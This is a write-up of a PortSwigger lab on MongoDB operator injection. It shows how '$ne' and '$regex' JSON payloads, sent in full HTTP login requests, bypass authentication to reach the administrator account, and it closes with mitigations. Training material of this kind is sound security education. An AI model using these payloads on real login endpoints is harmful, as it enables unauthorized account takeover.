# 📘 PortSwigger Lab: Exploiting NoSQL operator injection to bypass authentication

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/all-labs/nosql-injection/lab-nosql-injection-bypass-authentication  
> 🎯 Topic: NoSQL Injection — operator injection in MongoDB (authentication bypass)  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  
> 🛠 Tools: Burp Suite (Repeater)

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🗺 MongoDB Operators](#operators)
- [🔍 Step 1 — Recon: Log In as wiener](#step1)
- [🔍 Step 2 — Testing Operator Injection in username](#step2)
- [🔍 Step 3 — Confirming via $regex](#step3)
- [🔍 Step 4 — Double Injection: Unexpected Records](#step4)
- [🔍 Step 5 — Exploitation: Log In as admin](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

The login functionality is powered by MongoDB and is vulnerable to operator injection. The task:

```text
Log into the application as the administrator user.
```

Own-account credentials:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Short Theory

Unlike syntax injection (breaking the syntax), **operator injection** injects MongoDB query operators directly into the JSON structure of the request. If the application accepts JSON in the login parameters and passes it to `find()` without filtering:

```javascript
// vulnerable server-side code
db.users.find({ username: <input>, password: <input> })
```

then instead of a string you can pass an operator object — turning the comparison into an arbitrary condition.

### MongoDB Operators

```text
$ne      — not equal
$regex   — regular expression match
$gt      — greater than
$eq      — equal (explicit)
$in      — value in a list
$where   — arbitrary JavaScript (the most dangerous)
```

---

<a id="idea"></a>

## 🧩 Core Idea

A normal login query:

```javascript
{ username: "wiener", password: "peter" }   → find exactly this user
```

Injected:

```javascript
{ username: {"$ne":""}, password: {"$ne":""} }
              ↑ "not equal to empty string"
```

The condition becomes "username ≠ "" AND password ≠ "" — which matches **every** user. The database returns the first matching record, and the server logs into it. If the administrator is the first record in the collection, we are in as admin without any password.

---

<a id="operators"></a>

## 🗺 MongoDB Operators

A quick logic reference:

```text
username: {"$ne":""}     → match anyone whose username is not empty
username: {"$regex":"wien.*"} → match all users whose name starts with "wien"
username: {"$regex":"admin.*"} → match all users whose name starts with "admin"
```

$regex allows **probing** the collection: by iterating patterns you can learn which users exist without seeing their data directly.

---

<a id="step1"></a>

## 🔍 Step 1 — Recon: Log In as wiener

1. In Burp's browser, log in as `wiener:peter`.
2. Proxy → HTTP history → find:

```http
POST /login
Content-Type: application/json
```

3. Right-click → Send to Repeater.

The usual JSON body:

```json
{"username":"wiener","password":"peter"}
```

The server-side query (assumed):

```javascript
db.users.find({ username: "wiener", password: "peter" })
```

---

<a id="step2"></a>

## 🔍 Step 2 — Testing Operator Injection in username

Replace the username value with an operator:

```json
{"username":{"$ne":""},"password":"peter"}
```

Send. **Expected:** a successful login (not as wiener — the server logs into the first record matching the condition).

```text
$ne accepted and executed = input goes into the query unfiltered
```

---

<a id="step3"></a>

## 🔍 Step 3 — Confirming via $regex

Replace username with:

```json
{"username":{"$regex":"wien.*"},"password":"peter"}
```

**Expected:** a successful login as wiener (the regex matches the username).

```text
$ne works  +  $regex works  = operator injection confirmed
```

---

<a id="step4"></a>

## 🔍 Step 4 — Double Injection: Unexpected Records

Inject into both fields:

```json
{"username":{"$ne":""},"password":{"$ne":""}}
```

**Expected:** an error like "unexpected number of records" / "too many users".

Signal breakdown:

```text
One matching user    → login succeeds
Multiple matches     → the server cannot decide whom to log in → error
```

This is reconnaissance: the broad criterion matches many users — the selection must be narrowed to a single record.

---

<a id="step5"></a>

## 🔍 Step 5 — Exploitation: Log In as admin

Narrow the selection with a regex on the known name prefix:

```json
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

**Expected:** a successful login as **administrator** — only one user in the collection has a name starting with "admin".

Finalization:

1. Right-click the response → **Show response in browser**.
2. Copy the URL, paste it into Burp's browser.
3. Open the page — an administrator session → the lab is Solved.

---

<a id="requests"></a>

## 📨 Example Requests

### Step 2 — $ne in username

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$ne":""},"password":"peter"}
```

### Step 3 — $regex confirmation

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$regex":"wien.*"},"password":"peter"}
```

### Step 4 — both fields, unexpected records

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$ne":""},"password":{"$ne":""}}
```

### Step 5 — the final exploit

```http
POST /login HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: application/json

{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
```

---

<a id="response"></a>

## 📥 Example Result

### Steps 2–3 — successful login

```text
HTTP/2 302 Found
Location: /my-account
```

### Step 4 — multiplicity error

```text
Cannot login - unexpected number of records: 3
```

### Step 5 — admin login

```text
HTTP/2 302 Found
Location: /my-account
→ the administrator's account page

Lab status: Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter → POST /login to Repeater
2. username={"$ne":""} + password=peter → login succeeds (operators accepted)
3. username={"$regex":"wien.*"} → login as wiener (injection confirmed)
4. Both fields {"$ne":""} → "unexpected number of records" error
   (many users in the collection)
5. username={"$regex":"admin.*"} + password={"$ne":""} → login as admin
6. Show response in browser → the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. JSON Is Accepted As-Is

The application parses the request body and passes the values into `find()` without type checks. The server expects a string but receives the object `{"$ne":""}` — and Mongo executes it as a condition.

### 2. A String-vs-Operator Comparison Becomes a Replaced Condition

The "password matches" check turns from verifying a specific password into "password is not empty". A cryptographic check is replaced by a trivially true comparison.

### 3. The Server Logs into the First Returned Record

The business logic assumes "the query returned exactly one user". When several match — an error; when exactly one matches — a login. The regex `admin.*` narrows the selection to the target.

### 4. The Error Revealed the Collection Structure

The "unexpected number of records" message is reconnaissance: the broad criterion matches more than one user. This hinted that narrowing via $regex was needed.

### 5. A Session Is Issued on Match, Not on Knowledge of the Password

Authentication of the form "issue a session if the query found the user" is fundamentally broken when the attacker controls the query condition.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When testing a login for operator injection:

```text
1. Check the format: JSON body? URL parameters? (operator injection
   works in JSON; in URL parameters it is possible via syntax injection)
2. One-field probe: {"$ne":""} → did the result change?
3. $regex probe with a known name: {"$regex":"wiener.*"}
4. Both fields {"$ne":""} → a multiplicity error maps the collection
5. Narrowing: {"$regex":"admin.*"} / {"$regex":"a.*"} / {"$ne":"wiener"}
```

If the server accepts data as regular form parameters rather than JSON, the same operators can be sent as `username[$ne]=` (PHP style) — worth testing both variants.

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Injecting the Operator as a String

`{"username":"{\"$ne\":\"\"}","password":"peter"}` — an operator inside quotes is plain text. The operator must be an **object**: `"username":{"$ne":""}`.

### Mistake 2. Injecting Only into password Without Narrowing username

`{"username":"wiener","password":{"$ne":""}}` logs in as wiener — it "works" but achieves nothing. The point of the attack is escaping the known username, not replacing the password for it.

### Mistake 3. Missing the Unexpected Records Signal

The Step 4 error is not a dead end but reconnaissance: it says the broad criterion matches many users. Next step — narrowing via $regex.

### Mistake 4. Not URL-Encoding When Sending as Form-Data

If the server accepts form-data rather than JSON, the operator is sent as `username[$ne]=` — sending JSON syntax in a form field will not work.

### Mistake 5. Assuming $ne Always Returns the Admin First

Record order is not guaranteed. If another record comes first, the login lands in it. The correct answer is to narrow the criterion ($regex), not to rely on ordering.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Validate Input Types

Check that username and password are strings and reject objects:

```javascript
if (typeof req.body.username !== "string") reject();
```

### 2. Do Not Build the Query from User-Supplied Objects

Build the filter explicitly instead of forwarding the request body into `find()`:

```javascript
// bad
db.users.find({ username: req.body.username, password: req.body.password })

// good
db.users.find({ username: String(req.body.username) })
```

### 3. Compare Passwords Outside the Query

First find the user by name, then verify the password hash in code (bcrypt.compare) — the password condition never enters the query.

### 4. Restrict Redundant Operators

Ban `$where` and user-defined JS expressions; restrict permitted operators with a whitelist where the API requires them.

### 5. Exactly One Record

Log in only when exactly one match exists; otherwise reject (never take the first record).

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] POST /login (JSON) sent to Repeater

### Detection

- [ ] `username: {"$ne":""}` → login succeeds
- [ ] `username: {"$regex":"wien.*"}` → login as wiener
- [ ] Both fields `{"$ne":""}` → unexpected records error

### Exploitation

- [ ] `username: {"$regex":"admin.*"}` + `password: {"$ne":""}` → admin login
- [ ] Show response in browser → administrator session
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved via **operator injection in MongoDB**:

```text
1. Operators ($ne, $regex) are accepted in JSON fields unfiltered
2. Condition substitution: a password check → "password is not empty"
3. The unexpected records error revealed: many users match the broad criterion
4. $regex="admin.*" narrowed the selection to one → login as administrator
```

Main lessons:

```text
Operator injection is not syntax breaking but type substitution: string → condition object.
```

```text
Application errors are reconnaissance: "unexpected number of records" mapped the collection.
```

```text
The "query found the user → issue a session" logic is broken when the attacker controls the condition.
```

```text
Mitigation: type validation, explicit filters, password checks outside the query, rejecting multiple matches.
```

---

[⬆ Back to top](#top)
